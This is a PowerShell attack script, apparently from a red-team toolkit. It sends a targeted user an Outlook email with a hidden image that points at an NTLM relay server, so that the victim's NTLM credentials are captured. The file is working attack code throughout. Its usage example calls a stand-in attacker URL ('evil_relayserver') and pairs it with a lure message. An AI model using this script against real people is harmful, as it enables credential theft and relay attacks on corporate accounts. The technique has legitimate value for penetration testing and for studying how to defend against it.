function Invoke-SendEmail {
<#
	.SYNOPSIS
	Function: Invoke-SendMail
	Author: Arno0x0x, Twitter: @Arno0x0x
	
	This script sends an email to a targeted user embedding a hidden image pointing to the ntlmRelayToEWS server.
	You can use this trick to receive NTLM credentials from the target.

	Beware that the Outlook.Application COM object seems to only works with 32bits version of PowerShell, so use:
	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
	
	.EXAMPLE
	# Example of using this function
		PS C:> Invoke-SendEmail -Address "user@corporate.com" `
		-Subject "Important" -Message "Hi,<p>Could you please check something for me ?</p><p>Give me a sign</p>" `
		-RelayServerURL "http://evil_relayserver/signature.html"
	#>

	[cmdletbinding()]
	Param (
		[Parameter(Mandatory=$True)]
		[String]$Address,
		
		[Parameter(Mandatory=$True)]
		[String]$Subject,
		
		[Parameter(Mandatory=$True)]
		[String]$Message,
		
		[Parameter(Mandatory=$True)]
		[String]$RelayServerURL
	)
	
	Process {
		# Create an instance Microsoft Outlook
		$Outlook = New-Object -ComObject Outlook.Application
		$Mail = $Outlook.CreateItem(0)
		$Mail.To = "$Address"
		$Mail.Subject = $Subject
		#$Mail.Body = $Body
		$Mail.HTMLBody = "<!DOCTYPE HTML><html><body>" + $Message + "<p>-</p><p></p><div style='display: none'><img src='" + $RelayServerURL + "'/></div></body></html>"
		# $File = "D:\CP\timetable.pdf"
		# $Mail.Attachments.Add($File)
		$Mail.Send()
	} # End of Process section
	End {
		# Section to prevent error message in Outlook
		# $Outlook.Quit()
		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook)
		$Outlook = $null
   }
}

